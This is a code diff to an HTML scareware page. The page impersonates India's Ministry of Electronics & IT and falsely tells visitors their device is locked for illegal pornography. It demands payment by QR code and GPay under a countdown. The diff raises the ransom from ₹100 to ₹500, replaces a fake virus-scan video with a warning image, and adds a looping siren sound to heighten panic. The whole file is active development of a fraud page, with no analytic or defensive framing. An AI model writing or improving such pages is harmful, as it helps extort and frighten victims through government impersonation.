@@ -6,19 +6,14 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <!-- Video Container with Fallback Image -->
-  <div id="virusScan">
-    <video id="scanVideo" autoplay muted playsinline webkit-playsinline>
-      <source src="assets/videho.mp4" type="video/mp4">
-      Your browser does not support the video tag.
-    </video>
-    <!-- Fallback Image (hidden by default) -->
-    <img id="fallbackImage" src="assets/warning_fallback.jpg" alt="Warning" >
+  <!-- Image Warning Screen (replaces video) -->
+  <div id="warningScreen">
+    <img id="warningImage" src="assets/warning_image.jpg" alt="Security Warning">
   </div>
 
-
-  <!-- ✅ scamAlert hidden initially -->
+  <!-- Scam Alert Page (hidden initially) -->
   <div id="scamAlert" class="hidden">
+    <!-- Your existing scam alert content -->
     <div class="header">
       <img src="assets/govt_logo.png" alt="Cyber Crime Department">
       <h1>MINISTRY OF ELECTRONICS & IT</h1>
@@ -27,7 +22,7 @@
     <div class="alert-box">
       <p>🔴 <b>YOUR DEVICE HAS BEEN LOCKED</b> 🔴</p>
       <p>Reason: <span class="highlight">Illegal Pornography (Sec 67A IT Act)</span></p>
-      <p>Pay <b>₹100</b> within <span id="countdown">10:00</span> to avoid legal action.</p>
+      <p>Pay <b>₹500</b> within <span id="countdown">10:00</span> to avoid legal action.</p>
     </div>
 
     <div class="qr-code">
@@ -41,6 +36,8 @@
       <button onclick="Payment('GPay')"><img src="assets/gpay.png" alt="GPay"></button>
     </div>
   </div>
+
+  <audio id="siren" loop src="assets/siren.mp3"></audio>
   <script src="script.js"></script>
 </body>
 </html>
